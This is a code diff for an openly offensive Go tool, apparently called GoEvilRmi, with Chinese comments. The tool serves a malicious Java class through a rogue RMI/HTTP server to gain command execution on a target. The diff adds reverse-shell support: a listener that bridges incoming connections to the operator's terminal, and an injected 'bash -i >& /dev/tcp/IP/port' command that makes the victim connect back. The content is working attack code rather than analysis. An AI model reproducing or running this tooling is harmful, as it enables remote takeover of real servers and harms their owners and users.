@@ -1,16 +1,18 @@
 package main
 
 import (
+	"GoEvilRmi/tools"
 	"bytes"
 	"encoding/hex"
 	"flag"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"path/filepath"
 	"strconv"
 	"strings"
-	"test/tools"
+	"sync"
 )
 
 var flag1 = true
@@ -19,8 +21,10 @@ var IP string
 var cmd string
 var classfile string
 var httpport = 7777
-var classname = "Evil"
+var classname = "T3st"
 var rmiport = 7777
+var revport = 0
+var wg sync.WaitGroup
 
 func handleConnection1(conn net.Conn) {
 	defer conn.Close()
@@ -98,6 +102,7 @@ func handleConnection2(conn net.Conn) {
 			conn.Write(tools.GethttpEvilClass(cmd))
 		}
 		tools.Out("HTTP服务", "已经向目标发送恶意class，攻击流程完成。", true)
+		wg.Wait()
 		os.Exit(6666)
 	} else {
 		tools.Out("m4x", "收到不明连接", true)
@@ -137,18 +142,46 @@ func Step2() {
 	}
 }
 
+func Rev() {
+	wg.Add(1)
+	listener, err := net.Listen("tcp", ":"+strconv.Itoa(revport))
+	tools.Out("反弹shell", fmt.Sprintf("已经在%s端口启动反弹shell监听", strconv.Itoa(revport)), true)
+	if err != nil {
+		panic(err)
+	}
+	defer listener.Close()
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			fmt.Println(err)
+			continue
+		}
+		go func(conn net.Conn) {
+			rip := conn.RemoteAddr().String()
+			tools.Out("反弹shell", fmt.Sprintf("收到连接: [%s] 即将进入到交互shell模式", rip), true)
+			go io.Copy(os.Stdout, conn)
+			io.Copy(conn, os.Stdin)
+		}(conn)
+	}
+}
+
 func main() {
 	flag.StringVar(&IP, "i", "", "-i [公网IP]  一定要是目标机器能访问到的")
 	flag.StringVar(&cmd, "c", "", "-c [执行的命令] 注意，是Runtime.getRuntime().exec执行的，因此会导致某些格式的命令执行不了，特殊命令请自定义class来执行")
+	flag.IntVar(&revport, "r", 0, "-r [反弹shell的端口] 只支持目标为Linux时使用")
 	flag.StringVar(&classfile, "f", "", "-f [class文件名] 可以指定发送恶意类，将需要执行的代码放在static代码块里面即可，文件名请用 类名.xxx 的形式(xxx为任意字符串)，如:Evil.class")
 	flag.Parse()
-	if IP == "" && (cmd == "" && classfile == "") {
-		fmt.Println("IP 和 命令或class文件名 需要传入， -h 可以查看帮助")
+	if IP == "" && (cmd == "" && classfile == "" && flag.Lookup("r") == nil) {
+		fmt.Println("IP 和 命令或class文件名或-r参数 需要传入， -h 可以查看帮助")
 		os.Exit(1111)
 	}
-	if cmd != "" && classfile != "" {
-		fmt.Println("不能同时指定命令和class文件")
+	if cmd != "" && classfile != "" && flag.Lookup("r") != nil {
+		fmt.Println("不能同时指定命令和class文件和反弹shell")
 		os.Exit(1111)
+	}
+	if revport != 0 {
+		go Rev()
+		cmd = fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", IP, strconv.Itoa(revport))
 	}
 	if classfile != "" {
 		_, err := os.Stat(classfile)
@@ -164,4 +197,5 @@ func main() {
 	tools.Out("控制台", "请使用 rmi://"+IP+":6666/test 来进行使用", true)
 	go Step1()
 	Step2()
+	wg.Wait()
 }
